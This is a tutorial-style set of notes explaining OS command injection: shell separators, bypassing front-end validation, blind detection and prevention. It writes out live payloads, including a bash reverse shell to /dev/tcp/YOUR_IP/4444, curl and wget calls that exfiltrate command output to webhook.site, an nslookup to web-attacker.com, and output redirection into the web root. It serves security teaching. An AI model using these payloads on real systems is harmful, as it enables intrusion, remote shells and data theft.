# What is OS Command Injection?
Allows an attacker to execute operating system (OS) commands on the server that is running an application. In a command injection vulnerability, the goal is to break out of the intended command structure and inject your own OS-level commands.
- Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
## Injecting OS Commands through URLs
In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:
`https://insecure-website.com/stockStatus?productID=381&storeID=29`

To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
`stockreport.pl 381 29`

This command outputs the stock status for the specified item, which is returned to the user.

The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:
`& echo aiwefwlguh &`

If this input is submitted in the `productID` parameter, the command executed by the application is:
`stockreport.pl & echo aiwefwlguh & 29`

The `echo` command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The `&` character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:
`Error - productID was not provided`
`aiwefwlguh`
`29: command not found`

The three lines of output shows that:
- The original `stockreport.pl` command was executed without its expected arguments, and so returned an error message.
- The injected `echo` command was executed, and the supplied string was echoed in the output.
- The original argument `29` was executed as a command, which caused an error.

Placing the additional command separator `&` after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.

## Injecting Our Command through Inputs
We can add a semi-colon after our input IP `127.0.0.1`, and then append our command (e.g. `whoami`), such that the final payload we will use is (`127.0.0.1; whoami`), and the final command to be executed would be:
```bash
ping -c 1 127.0.0.1; whoami
```
from the look of the error message, it appears to be originating from the front-end rather than the back-end. We can double-check this with the `Firefox Developer Tools` by clicking `[CTRL + SHIFT + E]` to show the Network tab and then clicking on the `Check` button again.
As we can see, no new network requests were made when we clicked on the `Check` button, yet we got an error message. This indicates that the `user input validation is happening on the front-end`.

`it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.`
### Bypassing Front-End Validation
The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. To do so, we can start `Burp Suite`

We can now customize our HTTP request and send it to see how the web application handles it.
### Other Injection Operators
#### AND Operator
our final payload would be (`127.0.0.1 && whoami`), and the final executed command would be the following:
```bash
ping -c 1 127.0.0.1 && whoami
```
#### OR Operator
The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the `OR` operator would make our new command execute if the first one fails.

If we try to use our usual payload with the `||` operator (`127.0.0.1 || whoami`), we will see that only the first command would execute.

Let us try to intentionally break the first command by not supplying an IP and directly using the `||` operator (`|| whoami`), such that the `ping` command would fail and our injected command gets executed.

Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XML, etc. We have created a list of the most common operators that can be used for injections:

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |
Keep in mind that this table is incomplete, and many other options and operators are possible.
## Blind OS Command Injection Vulnerabilities
Many instances of OS command injection are blind vulnerabilities.
- Means that the application does not return the output from the command within its HTTP response.

As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the `mail` program with the submitted details:
`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

The output from the `mail` command (if any) is not returned in the application's responses, so using the `echo` payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.
### Detecting Blind OS Command Injection (Time Delays)
You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond.

The `ping` command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:
`& ping -c 10 127.0.0.1 &`

This command causes the application to ping its loopback network adapter for 10 seconds.
### Exploiting Blind OS Command Injection
#### Output Redirection
You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser.

For example, if the application serves static resources from the filesystem location `/var/www/static`, then you can submit the following input:

`& whoami > /var/www/static/whoami.txt &`

The `>` character sends the output from the `whoami` command to the specified file. You can then use the browser to fetch `https://vulnerable-website.com/whoami.txt` to retrieve the file, and view the output from the injected command.
#### Out-of-band Techniques
You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

`& nslookup kgji2ohoyw.web-attacker.com &`
- This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Your request could look something like this:
`ProductID=1||wget http://www.webhook.site/your-site||`

If you confirm this is vulnerable, you can connect to reverse shells, or execute commands and send them back to your website:

Reverse Shell:
`ProductID=1||bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'||

Sending Commands:
``ProductID=1||curl http://`whoami`.webhook.site/your-id||``
## Ways of injecting OS commands
You can use a number of shell metacharacters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:
- `&`
- `&&`
- `|`
- `||`

The following command separators work only on Unix-based systems:
- `;`
- Newline (`0x0a` or `\n`)

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
```
`INJECT-COMMAND`
```
Or:
```
$(INJECTED-COMMAND)
```
### Examples
```
1; whoami
1 & whoami & 
1 && whoami 
1 | whoami
1||whoami||
1`whoami` 
1$(whoami)
```
## How to prevent OS command injection attacks
The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs.

If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:

- Validating against a whitelist of permitted values.
- Validating that the input is a number.
- Validating that the input contains only alphanumeric characters, no other syntax or whitespace.

Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.